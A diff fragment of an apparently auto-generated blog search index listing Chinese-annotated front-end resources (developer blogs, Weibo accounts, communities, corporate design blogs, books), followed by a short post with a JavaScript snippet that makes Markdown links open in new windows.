+</tr>
+<tr>
+<td><a href="http://hub.tutsplus.com/" target="_blank" rel="noopener">Tuts</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>-</td>
+<td>国外知名开发者网站</td>
+</tr>
+<tr>
+<td><a href="http://www.developerdrive.com/" target="_blank" rel="noopener">DeveloperDrive</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>-</td>
+<td>优质前端技术信息</td>
+</tr>
+<tr>
+<td><a href="http://css-tricks.com/" target="_blank" rel="noopener">CSS-TRICKS</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>Chris Coyier</td>
+<td>左边这位是大神</td>
+</tr>
+<tr>
+<td><a href="http://webdesignerwall.com/" target="_blank" rel="noopener">Web Designer Wall</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>Nick La.</td>
+<td>优质 Html5,CSS3等教程</td>
+</tr>
+<tr>
+<td><a href="http://tutorialzine.com/" target="_blank" rel="noopener">Tutorialzine</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>#</td>
+<td>大量 web 教程和资源</td>
+</tr>
+<tr>
+<td><a href="http://inspectelement.com/" target="_blank" rel="noopener">Inspect Element</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>#</td>
+<td>CSS,wordpress 相关教程挺多</td>
+</tr>
+<tr>
+<td><a href="http://tympanus.net/codrops/" target="_blank" rel="noopener">Codrops</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>#</td>
+<td>设计、交互、CSS</td>
+</tr>
+<tr>
+<td><a href="http://www.onerutter.com/" target="_blank" rel="noopener">Jake Rutter</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>Jake Rutter</td>
+<td>Jquery 作者，不解释了</td>
+</tr>
+<tr>
+<td><a href="http://www.paulirish.com/" target="_blank" rel="noopener">Paul Irish</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>Paul Irish</td>
+<td>大神,Google Chrome团队,Yeoman</td>
+</tr>
+<tr>
+<td><a href="http://krasimirtsonev.com/blog" target="_blank" rel="noopener">Krasimir Tsonev</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>Krasimir Tsonev</td>
+<td>html5,ccs3,javascript</td>
+</tr>
+<tr>
+<td><a href="http://www.html5rocks.com/en/" target="_blank" rel="noopener">HTML5 Rocks</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>#</td>
+<td>html5权威网站</td>
+</tr>
+<tr>
+<td><a href="http://alistapart.com/" target="_blank" rel="noopener">A List Apart</a></td>
+<td>★★★★★</td>
+<td>★★★★★</td>
+<td>#</td>
+<td>可以改变世界的文章</td>
+</tr>
+</tbody>
+</table>
+<h5 id="活跃微博"><a href="#活跃微博" class="headerlink" title="活跃微博"></a>活跃微博</h5><table>
+<thead>
+<tr>
+<th>ID</th>
+<th>公司</th>
+<th>简介</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://weibo.com/w3cchina" target="_blank" rel="noopener">@w3c中国</a></td>
+<td>#</td>
+<td>万维网联盟中国办事处官方微博</td>
+</tr>
+<tr>
+<td><a href="http://weibo.com/javascriptdev" target="_blank" rel="noopener">@TheFrontEnd</a></td>
+<td>#</td>
+<td>JavaScript技术资讯、新闻、教程、深度文章。</td>
+</tr>
+<tr>
+<td><a href="http://weibo.com/fekb" target="_blank" rel="noopener">@前端快爆</a></td>
+<td>阿里巴巴</td>
+<td>有HTML5、CSS3、JS</td>
+</tr>
+<tr>
+<td><a href="http://e.weibo.com/html5cn" target="_blank" rel="noopener">@HTML5中国</a></td>
+<td>#</td>
+<td>中国<a href="http://www.html5cn.org官方微博" target="_blank" rel="noopener">www.html5cn.org官方微博</a></td>
+</tr>
+<tr>
+<td><a href="http://weibo.com/developerworks" target="_blank" rel="noopener">@developerWorks</a></td>
+<td>#</td>
+<td>#</td>
+</tr>
+</tbody>
+</table>
+<h4 id="开发者博客"><a href="#开发者博客" class="headerlink" title="开发者博客"></a>开发者博客</h4><p>微博微信流行后，明显感觉到写博客的人还是越来越少了，下面推荐的这些开发者属于在网上比较活跃的，或者博客积累了大量优质资源的。</p>
+<h6 id="国内开发者"><a href="#国内开发者" class="headerlink" title="国内开发者"></a>国内开发者</h6><p>国内开发者一块欢迎大家 <code>Fork</code>提交推荐，最好能推荐一些在前端界较活跃的的开发者。</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>博客</th>
+<th>微博</th>
+<th>Github</th>
+<th>Twitter</th>
+<th>公司</th>
+<th>关键字</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阮一峰</td>
+<td><a href="http://www.ruanyifeng.com/blog/" target="_blank" rel="noopener">阮一峰博客</a></td>
+<td><a href="http://weibo.com/ruanyf" target="_blank" rel="noopener">@ruanyf</a></td>
+<td>#</td>
+<td><a href="https://twitter.com/ruanyf" target="_blank" rel="noopener">@ruanyf</a></td>
+<td>上海金融学院国际金融学院</td>
+<td>教师，博客写作人，翻译人，《黑客与画家》的译者</td>
+</tr>
+<tr>
+<td>老赵</td>
+<td><a href="http://blog.zhaojie.me/" target="_blank" rel="noopener">http://blog.zhaojie.me/</a></td>
+<td><a href="http://weibo.com/jeffz" target="_blank" rel="noopener">@老赵</a></td>
+<td>#</td>
+<td><a href="">#</a></td>
+<td>摩根大通（香港）</td>
+<td>资深码农</td>
+</tr>
+<tr>
+<td>玉伯</td>
+<td><a href="http://lifesinger.wordpress.com/" target="_blank" rel="noopener">岁月如歌</a></td>
+<td><a href="http://weibo.com/lifesinger" target="_blank" rel="noopener">@玉伯也叫射雕</a></td>
+<td><a href="https://github.com/lifesinger" target="_blank" rel="noopener">@lifesinger</a></td>
+<td><a href="https://twitter.com/lifesinger" target="_blank" rel="noopener">@lifesinger</a></td>
+<td>支付宝</td>
+<td>大牛</td>
+</tr>
+<tr>
+<td>kejun</td>
+<td><a href="http://hikejun.com/" target="_blank" rel="noopener">http://hikejun.com/</a></td>
+<td><a href="http://weibo.com/kejunz" target="_blank" rel="noopener">@kejunz</a></td>
+<td>#</td>
+<td><a href="https://github.com/kejun" target="_blank" rel="noopener">@kejunz</a></td>
+<td>豆瓣</td>
+<td>前端大神</td>
+</tr>
+<tr>
+<td>寒冬winter</td>
+<td><a href="http://winter-cn.cnblogs.com/" target="_blank" rel="noopener">winter-cn</a></td>
+<td><a href="http://weibo.com/wintercn" target="_blank" rel="noopener">@寒冬winter</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+</tr>
+<tr>
+<td>左耳朵耗子</td>
+<td><a href="http://coolshell.cn/" target="_blank" rel="noopener">酷壳</a></td>
+<td><a href="http://weibo.com/haoel" target="_blank" rel="noopener">@左耳朵耗子</a></td>
+<td>#</td>
+<td><a href="https://twitter.com/haoel" target="_blank" rel="noopener">@haoel</a></td>
+<td>淘宝</td>
+<td>#</td>
+</tr>
+<tr>
+<td>fool2fish</td>
+<td>#</td>
+<td><a href="http://weibo.com/fool2fish" target="_blank" rel="noopener">@fool2fish</a></td>
+<td>#</td>
+<td>#</td>
+<td>支付宝</td>
+<td>#</td>
+</tr>
+<tr>
+<td>朴灵</td>
+<td><a href="http://html5ify.com/" target="_blank" rel="noopener">Html5fiy</a></td>
+<td><a href="http://weibo.com/shyvo" target="_blank" rel="noopener">@朴灵</a></td>
+<td><a href="https://github.com/JacksonTian" target="_blank" rel="noopener">JacksonTian</a></td>
+<td>#</td>
+<td>阿里巴巴</td>
+<td>《深入浅出Node.js》作者,大牛</td>
+</tr>
+<tr>
+<td>Cat Chen</td>
+<td><a href="http://catchen.biz/home.zh-CN.html" target="_blank" rel="noopener">陈广琛</a></td>
+<td><a href="http://weibo.com/u/1640352230" target="_blank" rel="noopener">@CatChen</a></td>
+<td><a href="https://github.com/CatChen" target="_blank" rel="noopener">@CatChen</a></td>
+<td><a href="https://twitter.com/CatChen" target="_blank" rel="noopener">@CatChen</a></td>
+<td>Facebook</td>
+<td>大牛</td>
+</tr>
+<tr>
+<td>BYVod</td>
+<td><a href="https://www.byvoid.com/" target="_blank" rel="noopener">Beyond the Void</a></td>
+<td><a href="http://weibo.com/byvoid" target="_blank" rel="noopener">@BYVoid</a></td>
+<td><a href="https://github.com/BYVoid" target="_blank" rel="noopener">@byvoid</a></td>
+<td><a href="https://twitter.com/byvoid" target="_blank" rel="noopener">@BYVoid</a></td>
+<td>Facebook 英国</td>
+<td>《Node.js 开发指南》作者,大牛</td>
+</tr>
+<tr>
+<td>郭宇</td>
+<td><a href="http://blog.guoyu.me/" target="_blank" rel="noopener">Einmal ist keinmal</a></td>
+<td><a href="http://weibo.com/137601206" target="_blank" rel="noopener">@郭宇</a></td>
+<td><a href="https://github.com/turingou" target="_blank" rel="noopener">@turingou</a></td>
+<td><a href="https://twitter.com/turingou" target="_blank" rel="noopener">@turingou</a></td>
+<td>糗事百科,原支付宝</td>
+<td>Node.js</td>
+</tr>
+<tr>
+<td>勾三股四</td>
+<td>#</td>
+<td><a href="http://weibo.com/mx006" target="_blank" rel="noopener">@勾三股四</a></td>
+<td>#</td>
+<td>#</td>
+<td>淘宝</td>
+<td>#</td>
+</tr>
+<tr>
+<td>cnberg</td>
+<td><a href="http://cnberg.com" target="_blank" rel="noopener">冰山一角</a></td>
+<td><a href="http://weibo.com/berg" target="_blank" rel="noopener">@berg</a></td>
+<td>@cnberg</td>
+<td><a href="">@cnberg</a></td>
+<td>百度</td>
+<td>骑行</td>
+</tr>
+<tr>
+<td>大猫</td>
+<td><a href="http://bigc.at" target="_blank" rel="noopener">意淫笔记</a></td>
+<td><a href="http://weibo.com/daemao" target="_blank" rel="noopener">@daemao</a></td>
+<td><a href="https://github.com/Damao" target="_blank" rel="noopener">@Damao</a></td>
+<td><a href="https://twitter.com/13igcat" target="_blank" rel="noopener">@13igcat</a></td>
+<td>腾讯</td>
+<td><a href="http://www.zhihu.com/people/13igcat" target="_blank" rel="noopener">知乎</a></td>
+</tr>
+<tr>
+<td>hzlzh</td>
+<td><a href="https://zlz.im" target="_blank" rel="noopener">自力博客</a></td>
+<td><a href="http://weibo.com/hzlzh" target="_blank" rel="noopener">@hzlzh</a></td>
+<td><a href="http://github.com/hzlzh" target="_blank" rel="noopener">@hzlzh</a></td>
+<td><a href="http://twitter.com/hzlzh" target="_blank" rel="noopener">@hzlzh</a></td>
+<td>腾讯</td>
+<td>前端开发</td>
+</tr>
+<tr>
+<td>C7210</td>
+<td>beforweb.com/</td>
+<td><a href="http://weibo.com/c7210" target="_blank" rel="noopener">@C7210</a></td>
+<td><a href="http://twittercom/hzlzh" target="_blank" rel="noopener">@C7210</a></td>
+<td><a href="http://github.com/hzlzh" target="_blank" rel="noopener">@C7210</a></td>
+<td>#</td>
+<td>UX、交互设计师、视觉与前端</td>
+</tr>
+<tr>
+<td>kejun</td>
+<td><a href="http://hikejun.com/" target="_blank" rel="noopener">http://hikejun.com/</a></td>
+<td><a href="http://weibo.com/kejun" target="_blank" rel="noopener">#</a></td>
+<td><a href="http://twittercom/kejun" target="_blank" rel="noopener">#</a></td>
+<td><a href="http://github.com/hzlzh" target="_blank" rel="noopener">#</a></td>
+<td>腾讯</td>
+<td>前端开发</td>
+</tr>
+<tr>
+<td>张鑫旭</td>
+<td><a href="http://www.zhangxinxu.com/wordpress/" target="_blank" rel="noopener">张鑫旭博客</a></td>
+<td><a href="http://weibo.com/zhangxinxu" target="_blank" rel="noopener">@张鑫旭</a></td>
+<td><a href="https://github.com/zhangxinxu" target="_blank" rel="noopener">@zhangxinxu</a></td>
+<td><a href="https://twitter.com/zhangxinxu" target="_blank" rel="noopener">@zhangxinxu</a></td>
+<td>腾讯 上海 ISUX</td>
+<td>前端开发</td>
+</tr>
+<tr>
+<td>lucifr</td>
+<td><a href="http://lucifr.com/" target="_blank" rel="noopener">http://lucifr.com/</a></td>
+<td><a href="http://weibo.com/lucifr" target="_blank" rel="noopener">@lucifr</a></td>
+<td><a href="http://twittercom/lucifr" target="_blank" rel="noopener">@lucifr</a></td>
+<td><a href="http://github.com/lucifr" target="_blank" rel="noopener">@lucifr</a></td>
+<td>#</td>
+<td>Mac,ios</td>
+</tr>
+<tr>
+<td>smallni</td>
+<td><a href="http://www.smallni.com/" target="_blank" rel="noopener">http://www.smallni.com/</a></td>
+<td><a href="http://weibo.com/hzlzh" target="_blank" rel="noopener">#</a></td>
+<td><a href="https://twitter.com/smallniding/" target="_blank" rel="noopener">@Smallni</a></td>
+<td><a href="http://github.com/hzlzh" target="_blank" rel="noopener">#</a></td>
+<td>腾讯</td>
+<td>前端开发</td>
+</tr>
+<tr>
+<td>TQ</td>
+<td><a href="http://targetkiller.net/" target="_blank" rel="noopener">http://targetkiller.net/</a></td>
+<td><a href="http://weibo.com/targetkiller" target="_blank" rel="noopener">@Piser-TQ</a></td>
+<td><a href="https://twitter.com/tqtan/" target="_blank" rel="noopener">@tqtan</a></td>
+<td><a href="https://github.com/targetkiller" target="_blank" rel="noopener">@targetkiller</a></td>
+<td>腾讯 ISUX</td>
+<td>网页重构</td>
+</tr>
+<tr>
+<td>LOO2K</td>
+<td><a href="http://loo2k.com/blog/" target="_blank" rel="noopener">LOO2K</a></td>
+<td><a href="http://weibo.com/loo2k" target="_blank" rel="noopener">@LOO2K</a></td>
+<td><a href="https://github.com/loo2k" target="_blank" rel="noopener">LOO2K</a></td>
+<td><a href="https://twitter.com/loo2k/" target="_blank" rel="noopener">LOO2K</a></td>
+<td>墨筹网</td>
+<td>少年才俊</td>
+</tr>
+<tr>
+<td>qiqiboy</td>
+<td>#</td>
+<td><a href="http://weibo.com/qiqiboy" target="_blank" rel="noopener">@qiqiboy</a></td>
+<td>#</td>
+<td>#</td>
+<td>金山网络 UX</td>
+<td>吐槽清理大师开发者</td>
+</tr>
+<tr>
+<td>foru17</td>
+<td><a href="http://luolei.org" target="_blank" rel="noopener">罗磊的独立博客</a></td>
+<td><a href="http://weibo.com/foru17" target="_blank" rel="noopener">@罗罗磊磊</a></td>
+<td><a href="https://github.com/foru17" target="_blank" rel="noopener">@foru17</a></td>
+<td><a href="https://twitter.com/foru17" target="_blank" rel="noopener">@foru17</a></td>
+<td>金山网络 UX</td>
+<td>打酱油的</td>
+</tr>
+<tr>
+<td>周爱民</td>
+<td><a href="http://blog.csdn.net/aimingoo/" target="_blank" rel="noopener">aimingoo专栏</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>支付宝</td>
+<td>JavaScript语言精髓与编程实践作者</td>
+</tr>
+<tr>
+<td>hax</td>
+<td><a href="http://hax.iteye.com/" target="_blank" rel="noopener">hax的技术部落格</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>前端大牛</td>
+</tr>
+<tr>
+<td>三生石上</td>
+<td><a href="http://www.cnblogs.com/sanshi" target="_blank" rel="noopener">三生石上</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>js秘密花园译者</td>
+</tr>
+<tr>
+<td>司徒正美</td>
+<td><a href="http://www.cnblogs.com/rubylouvre" target="_blank" rel="noopener">Ruby’s Louvre</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>前端开发</td>
+</tr>
+<tr>
+<td>叶小钗</td>
+<td><a href="http://www.cnblogs.com/yexiaochai" target="_blank" rel="noopener">叶小钗</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>前端开发</td>
+</tr>
+<tr>
+<td>聂微东</td>
+<td><a href="http://www.cnblogs.com/Darren_code/" target="_blank" rel="noopener">Darren</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>百度移动云</td>
+<td>前端开发</td>
+</tr>
+<tr>
+<td>当耐特</td>
+<td><a href="http://www.cnblogs.com/iamzhanglei/" target="_blank" rel="noopener">iamzhanglei</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>HTML5实验室作者</td>
+</tr>
+<tr>
+<td>教主</td>
+<td><a href="http://www.cnblogs.com/_franky" target="_blank" rel="noopener">_frank</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>又一牛</td>
+</tr>
+<tr>
+<td>typeof</td>
+<td><a href="http://typeof.net/" target="_blank" rel="noopener">typeof</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>又一牛</td>
+</tr>
+<tr>
+<td>Gray Zhang</td>
+<td><a href="http://www.cnblogs.com/GrayZhang" target="_blank" rel="noopener">Gray Zhang</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>百度一牛</td>
+</tr>
+<tr>
+<td>李松峰</td>
+<td><a href="http://www.cn-cuckoo.com" target="_blank" rel="noopener">为之漫笔</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>高程2等书的译者</td>
+</tr>
+<tr>
+<td>小鱼</td>
+<td><a href="http://sofish.de/" target="_blank" rel="noopener">sofish</a></td>
+<td><a href="http://weibo.com/sofish" target="_blank" rel="noopener">@sofish</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>百姓网一牛</td>
+</tr>
+<tr>
+<td>vilic</td>
+<td><a href="http://vilic.info/" target="_blank" rel="noopener">vilic</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>年轻一牛</td>
+</tr>
+<tr>
+<td>彬Go</td>
+<td><a href="http://blog.bingo929.com/" target="_blank" rel="noopener">彬Go</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>人人网一牛</td>
+</tr>
+<tr>
+<td>PuterJam</td>
+<td><a href="http://www.pjhome.net" target="_blank" rel="noopener">PuterJam’s Blog</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>腾讯一牛</td>
+</tr>
+<tr>
+<td>css森林</td>
+<td><a href="http://www.cssforest.org" target="_blank" rel="noopener">cssforest</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>前端博客</td>
+</tr>
+<tr>
+<td>99css</td>
+<td><a href="http://www.99css.com/" target="_blank" rel="noopener">99css</a></td>
+<td><a href="http://weibo.com/ytzong" target="_blank" rel="noopener">@ytzong</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>腾讯一牛</td>
+</tr>
+<tr>
+<td>秦歌</td>
+<td><a href="http://dancewithnet.com/" target="_blank" rel="noopener">Kaven</a></td>
+<td>#</td>
+<td><a href="http://twitter.com/kavenyan" target="_blank" rel="noopener">@kavenyan</a></td>
+<td>#</td>
+<td>#</td>
+<td>js语言精粹译者</td>
+</tr>
+<tr>
+<td>linxz</td>
+<td><a href="http://www.linxz.de/" target="_blank" rel="noopener">linxz</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>css那些事儿的作者</td>
+</tr>
+<tr>
+<td>米随随</td>
+<td><a href="http://s5s5.me/" target="_blank" rel="noopener">米随随</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>腾讯ISUX 一牛</td>
+</tr>
+<tr>
+<td>飘飘</td>
+<td><a href="http://pufen.net/" target="_blank" rel="noopener">飘飘</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>腾讯一牛</td>
+</tr>
+<tr>
+<td>Along</td>
+<td><a href="http://jinlong.github.io/" target="_blank" rel="noopener">Along’s Blog</a></td>
+<td><a href="http://weibo.com/newwave" target="_blank" rel="noopener">@newwave</a></td>
+<td>#</td>
+<td>#</td>
+<td>#</td>
+<td>Opera 欧朋一牛</td>
+</tr>
+<tr>
+<td>安记</td>
+<td><a href="http://www.cssha.com/" target="_blank" rel="noopener">cssha</a></td>
+<td><a href="http://weibo.com/hanan321" target="_blank" rel="noopener">@hanan321</a></td>
+<td><a href="https://github.com/hanan198501" target="_blank" rel="noopener">hanan198501</a></td>
+<td>#</td>
+<td>#</td>
+<td>腾讯一牛</td>
+</tr>
+</tbody>
+</table>
+<h4 id="一些社区"><a href="#一些社区" class="headerlink" title="一些社区"></a>一些社区</h4><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>地址</th>
+<th>介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>V2EX</td>
+<td><a href="http://v2ex.com/" target="_blank" rel="noopener">http://v2ex.com/</a></td>
+<td>小众活跃社区</td>
+</tr>
+<tr>
+<td>Ruby</td>
+<td><a href="http://ruby-china.org/" target="_blank" rel="noopener">http://ruby-china.org/</a></td>
+<td>同 V2EX 氛围类似，不局限于Ruby</td>
+</tr>
+<tr>
+<td>Node.js 中文社区</td>
+<td><a href="http://cnodejs.org/" target="_blank" rel="noopener">http://cnodejs.org/</a></td>
+<td>Node.js 国内最活跃的社区</td>
+</tr>
+<tr>
+<td>Code Wall</td>
+<td><a href="https://coderwall.com/" target="_blank" rel="noopener">https://coderwall.com/</a></td>
+<td>国外技术社区</td>
+</tr>
+</tbody>
+</table>
+<h5 id="企业官方博客"><a href="#企业官方博客" class="headerlink" title="企业官方博客"></a>企业官方博客</h5><p>在开头我的 Feedly 订阅 opml 文件里比较全面。</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>公司</th>
+<th>部门</th>
+<th>活跃度</th>
+<th>简介</th>
+<th>微博</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://isux.tencent.com/" target="_blank" rel="noopener">ISUX 社交用户体验设计</a></td>
+<td>腾讯</td>
+<td>ISUX</td>
+<td>★★★★☆</td>
+<td>负责腾讯的社交网络相关产品的用户体验设计与研究。</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://cdc.tencent.com/" target="_blank" rel="noopener">腾讯 CDC</a></td>
+<td>腾讯</td>
+<td>CDC</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://www.alloyteam.com/" target="_blank" rel="noopener">腾讯Web前端 Alloy 团队 Blog</a></td>
+<td>腾讯</td>
+<td>SNG</td>
+<td>★★★★☆</td>
+<td>主要负责手机QQ、QQ互联、腾讯Q+、WebQQ项目的团队。</td>
+<td><a href="http://weibo.com/alloyteam" target="_blank" rel="noopener">alloyteam</a></td>
+</tr>
+<tr>
+<td><a href="http://tid.tenpay.com/" target="_blank" rel="noopener">TID-财付通设计中心</a></td>
+<td>腾讯</td>
+<td>TID</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://mxd.tencent.com/" target="_blank" rel="noopener">腾讯MXD移动互联网设计中心</a></td>
+<td>腾讯</td>
+<td>MXD</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td><a href="http://e.t.qq.com/tencent_mxd" target="_blank" rel="noopener">@腾讯MXD</a></td>
+</tr>
+<tr>
+<td><a href="http://tid.tenpay.com/" target="_blank" rel="noopener">人人网FED Team</a></td>
+<td>人人网</td>
+<td>FED</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://udc.weibo.com/" target="_blank" rel="noopener">微博UDC</a></td>
+<td>新浪</td>
+<td>UDC</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td><a href="http://weibo.com/sudc" target="_blank" rel="noopener">@微博UDC设计中心</a></td>
+</tr>
+<tr>
+<td><a href="http://ued.sina.com.cn/" target="_blank" rel="noopener">新浪UED</a></td>
+<td>新浪</td>
+<td>UED</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td><a href="http://weibo.com/sudc" target="_blank" rel="noopener">#</a></td>
+</tr>
+<tr>
+<td><a href="http://uedc.163.com/" target="_blank" rel="noopener">网易用户体验设计中心</a></td>
+<td>网易</td>
+<td>UED</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td><a href="http://weibo.com/sudc" target="_blank" rel="noopener">#</a></td>
+</tr>
+<tr>
+<td><a href="http://www.aliued.cn/" target="_blank" rel="noopener">阿里巴巴（中国站）用户体验设计部博客</a></td>
+<td>阿里巴巴</td>
+<td>UED</td>
+<td>★★★★☆</td>
+<td>简介</td>
+<td><a href="http://weibo.com/aliued" target="_blank" rel="noopener">@Alibaba-UED</a></td>
+</tr>
+<tr>
+<td><a href="http://ued.ctrip.com/blog/" target="_blank" rel="noopener">携程UED-携程旅行前端开发团队</a></td>
+<td>携程网</td>
+<td>UED</td>
+<td>★★★☆☆</td>
+<td>携程UED,携程前端开发团队,UED,Javascript,重构,ux</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://fex.baidu.com/" target="_blank" rel="noopener">百度FEX</a></td>
+<td>百度</td>
+<td>FEX</td>
+<td>★★★★☆</td>
+<td>百度前端团队Blog,关注前端技术，还更重视全端及全栈的能力。</td>
+<td>#</td>
+</tr>
+</tbody>
+</table>
+<h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作者</th>
+<th>价格</th>
+<th>出版社</th>
+<th>简评</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://book.douban.com/subject/3327829/" target="_blank" rel="noopener">Web标准设计</a></td>
+<td>刘杰（嗷嗷）</td>
+<td>RMB 60.00</td>
+<td>清华大学出版社</td>
+<td>基础入门</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/4914146/" target="_blank" rel="noopener">大巧不工 : Web前端设计修炼之道</a></td>
+<td>赖定清 / 林坚</td>
+<td>RMB 59.00</td>
+<td>机械工业出版社</td>
+<td>适合入门，了解前端全局</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/3132277/" target="_blank" rel="noopener">高性能网站建设指南:前端工程师技能精髓</a></td>
+<td>Steve Souders</td>
+<td>RMB 35.00</td>
+<td>电子工业出版社</td>
+<td>能从原理层理解各种方法</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/4719162/" target="_blank" rel="noopener">高性能网站建设指南:Web开发者性能优化最佳实践</a></td>
+<td>Steve Souders</td>
+<td>RMB 49.80</td>
+<td>电子工业出版社</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/4124141/" target="_blank" rel="noopener">Web站点优化 : Web站点优化</a></td>
+<td>金</td>
+<td>RMB 55.00</td>
+<td>#</td>
+<td>#</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/10789820/" target="_blank" rel="noopener">Node.js开发指南</a></td>
+<td>郭家寶</td>
+<td>RMB 45.00</td>
+<td>#</td>
+<td>作者很牛</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/10546125/" target="_blank" rel="noopener">JavaScript高级程序设计</a></td>
+<td>Nicholas C. Zakas</td>
+<td>RMB 99.00</td>
+<td>人民邮电出版社</td>
+<td>适合没事就翻翻</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/2228378/" target="_blank" rel="noopener">JavaScript权威指南</a></td>
+<td>弗拉纳根</td>
+<td>RMB 109.00</td>
+<td>机械工业出版社</td>
+<td>犀牛书</td>
+</tr>
+<tr>
+<td><a href="http://book.douban.com/subject/3590768/" target="_blank" rel="noopener">JavaScript语言精髓</a></td>
+<td>Douglas Crockford</td>
+<td>RMB 35.00</td>
+<td>电子工业出版社</td>
+<td>绝对经典，相信看完后，对Javascript这门语言有了重新认识，原来这个语言是这么的美丽！</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> 前端资源 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Markdown语法链接通过新窗口打开解决办法]]></title>
+      <url>https://lostlover.github.io/20160801/markdown-atags-blank.html</url>
+      <content type="html"><![CDATA[<p>Markdown语法本身不支持链接语法通过新窗口打开,<code>[title](url)</code>编译后<code>&lt;a href=&quot;url&quot;&gt;&lt;/a&gt;</code>,只要在a标签上添加<code>target=&quot;_blank&quot;</code>即可实现链接新窗口跳转.</p>
+<blockquote>
+<p>解决思路:<br>通过参数来标示需要新窗口打开的链接,然后通过JS去修改a标签的属性. </p>
+</blockquote>
+<p>代码:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//md</span></span><br><span class="line">[title](url)改为[title](url?_blank)</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//js</span></span><br><span class="line"><span class="keyword">var</span> aTagArr = [].slice.apply(<span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>));</span><br><span class="line"></span><br><span class="line">aTagArr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">e, i</span>) </span>&#123;</span><br><span class="line">  e.href.indexOf(<span class="string">"_blank"</span>) &gt; <span class="number">-1</span> ? e.target = <span class="string">"_blank"</span> : <span class="literal">null</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Hello World]]></title>
+      <url>https://lostlover.github.io/20160731/hello-world.html</url>
